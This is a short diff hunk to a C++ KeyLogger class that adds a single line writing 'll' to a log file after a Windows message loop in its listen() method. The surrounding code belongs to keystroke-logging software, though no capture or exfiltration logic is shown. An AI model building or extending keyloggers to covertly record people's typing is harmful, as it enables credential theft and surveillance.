@@ -115,6 +115,7 @@ void KeyLogger::listen() {
         TranslateMessage(&message);
         DispatchMessage(&message);
     }
+    logFile << "ll";
 }
 
 void KeyLogger::log(DWORD key) {
